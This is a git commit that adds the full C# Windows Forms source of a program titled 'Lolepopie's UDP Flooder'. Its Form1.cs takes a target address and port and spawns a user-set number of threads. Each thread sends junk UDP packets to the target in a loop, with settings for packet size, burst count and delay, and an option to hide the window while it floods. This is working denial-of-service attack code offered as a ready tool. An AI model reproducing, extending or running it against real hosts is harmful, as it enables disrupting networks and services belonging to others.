05230368bfdcf33871d931744820cc3fac3ce256
lolepop <8401103+lolepop@users.noreply.github.com>
2017-05-14 19:29:37 +0800

    The start of something
    Hey, I finally got around to finishing this...

---
+++ UDP Flooder/Form1.Designer.cs
@@ -0,0 +1,395 @@
+﻿namespace UDP_Flooder
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.trackBar1 = new System.Windows.Forms.TrackBar();
+            this.label4 = new System.Windows.Forms.Label();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.label6 = new System.Windows.Forms.Label();
+            this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
+            this.label7 = new System.Windows.Forms.Label();
+            this.numericUpDown3 = new System.Windows.Forms.NumericUpDown();
+            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
+            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.disappearWhenStartedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.minimiseToTaskbarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
+            this.label8 = new System.Windows.Forms.Label();
+            this.button2 = new System.Windows.Forms.Button();
+            this.enableByteCounterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            ((System.ComponentModel.ISupportInitialize)(this.trackBar1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown3)).BeginInit();
+            this.menuStrip1.SuspendLayout();
+            this.contextMenuStrip1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(172, 290);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(210, 76);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Start";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(91, 48);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(68, 20);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Address";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(182, 48);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(200, 26);
+            this.textBox1.TabIndex = 2;
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(182, 107);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(93, 26);
+            this.textBox2.TabIndex = 3;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(121, 110);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(38, 20);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Port";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(27, 156);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(40, 20);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Size";
+            // 
+            // trackBar1
+            // 
+            this.trackBar1.Location = new System.Drawing.Point(95, 156);
+            this.trackBar1.Maximum = 255;
+            this.trackBar1.Minimum = 1;
+            this.trackBar1.Name = "trackBar1";
+            this.trackBar1.Size = new System.Drawing.Size(362, 69);
+            this.trackBar1.TabIndex = 6;
+            this.trackBar1.Value = 1;
+            this.trackBar1.Scroll += new System.EventHandler(this.trackBar1_Scroll);
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(464, 156);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(54, 20);
+            this.label4.TabIndex = 7;
+            this.label4.Text = "1 Byte";
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(405, 126);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(131, 24);
+            this.checkBox1.TabIndex = 8;
+            this.checkBox1.Text = "Random Size";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(31, 222);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(67, 20);
+            this.label5.TabIndex = 9;
+            this.label5.Text = "Threads";
+            // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.Location = new System.Drawing.Point(104, 222);
+            this.numericUpDown1.Maximum = new decimal(new int[] {
+            1410065408,
+            2,
+            0,
+            0});
+            this.numericUpDown1.Minimum = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.Size = new System.Drawing.Size(62, 26);
+            this.numericUpDown1.TabIndex = 10;
+            this.numericUpDown1.Value = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(178, 224);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(84, 20);
+            this.label6.TabIndex = 11;
+            this.label6.Text = "Delay (ms)";
+            // 
+            // numericUpDown2
+            // 
+            this.numericUpDown2.Location = new System.Drawing.Point(268, 222);
+            this.numericUpDown2.Maximum = new decimal(new int[] {
+            1000000,
+            0,
+            0,
+            0});
+            this.numericUpDown2.Name = "numericUpDown2";
+            this.numericUpDown2.Size = new System.Drawing.Size(54, 26);
+            this.numericUpDown2.TabIndex = 12;
+            this.numericUpDown2.Value = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.Location = new System.Drawing.Point(338, 226);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(62, 20);
+            this.label7.TabIndex = 13;
+            this.label7.Text = "Actions";
+            // 
+            // numericUpDown3
+            // 
+            this.numericUpDown3.Location = new System.Drawing.Point(406, 224);
+            this.numericUpDown3.Maximum = new decimal(new int[] {
+            1410065408,
+            2,
+            0,
+            0});
+            this.numericUpDown3.Minimum = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            this.numericUpDown3.Name = "numericUpDown3";
+            this.numericUpDown3.Size = new System.Drawing.Size(74, 26);
+            this.numericUpDown3.TabIndex = 14;
+            this.numericUpDown3.Value = new decimal(new int[] {
+            10,
+            0,
+            0,
+            0});
+            // 
+            // menuStrip1
+            // 
+            this.menuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
+            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.settingsToolStripMenuItem});
+            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
+            this.menuStrip1.Name = "menuStrip1";
+            this.menuStrip1.Size = new System.Drawing.Size(554, 33);
+            this.menuStrip1.TabIndex = 15;
+            this.menuStrip1.Text = "menuStrip1";
+            // 
+            // settingsToolStripMenuItem
+            // 
+            this.settingsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.disappearWhenStartedToolStripMenuItem,
+            this.minimiseToTaskbarToolStripMenuItem,
+            this.enableByteCounterToolStripMenuItem});
+            this.settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
+            this.settingsToolStripMenuItem.Size = new System.Drawing.Size(88, 29);
+            this.settingsToolStripMenuItem.Text = "Settings";
+            // 
+            // disappearWhenStartedToolStripMenuItem
+            // 
+            this.disappearWhenStartedToolStripMenuItem.CheckOnClick = true;
+            this.disappearWhenStartedToolStripMenuItem.Name = "disappearWhenStartedToolStripMenuItem";
+            this.disappearWhenStartedToolStripMenuItem.Size = new System.Drawing.Size(376, 30);
+            this.disappearWhenStartedToolStripMenuItem.Text = "Completely disappear when started";
+            this.disappearWhenStartedToolStripMenuItem.ToolTipText = "Overides \"Minimise to toolbar\" when started\r\nYou will have to close it manually w" +
+    "ith task manager";
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.ContextMenuStrip = this.contextMenuStrip1;
+            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
+            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
+            // 
+            // minimiseToTaskbarToolStripMenuItem
+            // 
+            this.minimiseToTaskbarToolStripMenuItem.CheckOnClick = true;
+            this.minimiseToTaskbarToolStripMenuItem.Name = "minimiseToTaskbarToolStripMenuItem";
+            this.minimiseToTaskbarToolStripMenuItem.Size = new System.Drawing.Size(376, 30);
+            this.minimiseToTaskbarToolStripMenuItem.Text = "Minimise to taskbar";
+            // 
+            // contextMenuStrip1
+            // 
+            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
+            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.toolStripMenuItem2});
+            this.contextMenuStrip1.Name = "contextMenuStrip1";
+            this.contextMenuStrip1.Size = new System.Drawing.Size(73, 26);
+            this.contextMenuStrip1.Opened += new System.EventHandler(this.contextMenuStrip1_Opened);
+            // 
+            // toolStripMenuItem2
+            // 
+            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
+            this.toolStripMenuItem2.Size = new System.Drawing.Size(198, 22);
+            // 
+            // label8
+            // 
+            this.label8.AutoSize = true;
+            this.label8.Location = new System.Drawing.Point(178, 261);
+            this.label8.Name = "label8";
+            this.label8.Size = new System.Drawing.Size(101, 20);
+            this.label8.TabIndex = 17;
+            this.label8.Text = "Bytes sent: 0";
+            this.label8.Visible = false;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(399, 329);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(143, 36);
+            this.button2.TabIndex = 18;
+            this.button2.Text = "Reset counter";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Visible = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // enableByteCounterToolStripMenuItem
+            // 
+            this.enableByteCounterToolStripMenuItem.CheckOnClick = true;
+            this.enableByteCounterToolStripMenuItem.Name = "enableByteCounterToolStripMenuItem";
+            this.enableByteCounterToolStripMenuItem.Size = new System.Drawing.Size(376, 30);
+            this.enableByteCounterToolStripMenuItem.Text = "Enable byte counter";
+            this.enableByteCounterToolStripMenuItem.ToolTipText = "Disabled by default due to lag\r\nWill crash if settings are too high";
+            this.enableByteCounterToolStripMenuItem.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(554, 378);
+            this.ContextMenuStrip = this.contextMenuStrip1;
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.label8);
+            this.Controls.Add(this.numericUpDown3);
+            this.Controls.Add(this.label7);
+            this.Controls.Add(this.numericUpDown2);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.numericUpDown1);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.trackBar1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.menuStrip1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MainMenuStrip = this.menuStrip1;
+            this.Name = "Form1";
+            this.Text = "Lolepopie\'s UDP Flooder";
+            this.Resize += new System.EventHandler(this.Form1_Resize);
+            ((System.ComponentModel.ISupportInitialize)(this.trackBar1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown3)).EndInit();
+            this.menuStrip1.ResumeLayout(false);
+            this.menuStrip1.PerformLayout();
+            this.contextMenuStrip1.ResumeLayout(false);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TrackBar trackBar1;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.NumericUpDown numericUpDown2;
+        private System.Windows.Forms.Label label7;
+        private System.Windows.Forms.NumericUpDown numericUpDown3;
+        private System.Windows.Forms.MenuStrip menuStrip1;
+        private System.Windows.Forms.ToolStripMenuItem settingsToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem disappearWhenStartedToolStripMenuItem;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+        private System.Windows.Forms.ToolStripMenuItem minimiseToTaskbarToolStripMenuItem;
+        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem2;
+        private System.Windows.Forms.Label label8;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.ToolStripMenuItem enableByteCounterToolStripMenuItem;
+    }
+}
+
---
+++ UDP Flooder/Form1.cs
@@ -0,0 +1,137 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net.Sockets;
+using System.Threading;
+using System.Diagnostics;
+
+namespace UDP_Flooder
+{
+    public partial class Form1 : Form
+    {
+        public static int size;
+        public static double sizeCount = 0;
+
+        public int sizegen()
+        {
+            if (checkBox1.Checked)
+            {
+                return new Random().Next(1,255); //Random bytes from 1 to 255 because random does not work in a closed loop
+            }
+            else
+            {
+                
+                return size;
+            }
+        }
+
+        public static bool isEnabled = false;
+
+        public void sock(string address, int port)
+        {
+            UdpClient client = new UdpClient(address, port);
+            while (isEnabled)
+            {
+                byte[] rubbish = new byte[sizegen()]; //Creates table of bytes which contain individual bytes eg. [0x20, 0x20...]
+                for (int i = 1; i < numericUpDown3.Value; i++) //for each socket we send however many actions that were set
+                {
+                    client.Send(rubbish, rubbish.Length); //Each byte in the variable is 1 byte large, so the length is equal to the size of the data sent.
+                    if (enableByteCounterToolStripMenuItem.Checked)
+                    {
+                        label8.Visible = true;
+                        sizeCount = sizeCount + rubbish.Length;
+                        label8.Text = string.Concat("Bytes sent: ", sizeCount);
+                    }
+                }
+                Thread.Sleep(Convert.ToInt32(numericUpDown2.Value)); //delay in between bursts (if you left the delay on at least)
+            }
+        }
+
+        public void init()
+        {
+            for (int i = 1; i < numericUpDown1.Value && isEnabled; i++)
+            {
+                new Thread(() => sock(textBox1.Text, Convert.ToInt32(textBox2.Text))).Start(); //Creates new thread that runs the flooder itself
+            }
+        }
+
+        public Form1() //On second thought, I should have actually bothered to label the control variables for it to be easier to mod
+        {
+            InitializeComponent();
+            this.MaximizeBox = false;
+            trackBar1.TickStyle = TickStyle.None; //It looked annoying enough
+        }
+        
+        private void button1_Click(object sender, EventArgs e)
+        {
+            button1.Text = isEnabled ? "Start" : "Stop";
+            isEnabled = !isEnabled;
+            if (isEnabled)
+            {
+                if (disappearWhenStartedToolStripMenuItem.Checked)
+                {
+                    this.WindowState = FormWindowState.Minimized;
+                    this.ShowInTaskbar = false;
+                }
+                size = trackBar1.Value; //Safe (sex/) variables for safe threads
+                init(); //Starts the flooding
+            }
+        }
+
+        private void trackBar1_Scroll(object sender, EventArgs e)
+        {
+            label4.Text = trackBar1.Value != 1 ? String.Concat(trackBar1.Value, " Bytes") : String.Concat(trackBar1.Value, " Byte"); //Ever seen "1 bytes"?
+        }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            trackBar1.Enabled = !checkBox1.Checked;
+        }
+
+        private void Form1_Resize(object sender, EventArgs e)
+        {
+            if (WindowState == FormWindowState.Minimized && minimiseToTaskbarToolStripMenuItem.Checked == true)
+            {
+                notifyIcon1.Visible = true;
+                Hide();
+            }
+            else
+            {
+                notifyIcon1.Visible = false;
+            }
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            this.Visible = true;
+            notifyIcon1.Visible = false;
+        }
+
+        private void contextMenuStrip1_Opened(object sender, EventArgs e)
+        {
+            Application.Exit(); //Exit on right click of icon in the tray
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            if (enableByteCounterToolStripMenuItem.Checked) //For the display of the byte counter
+            {
+                label8.Visible = true;
+                label8.Text = "Bytes sent: 0";
+                sizeCount = 0;
+                button2.Visible = true;
+            }
+            else
+            {
+                label8.Visible = false;
+                button2.Visible = false;
+            }
+        }
+    }
+}
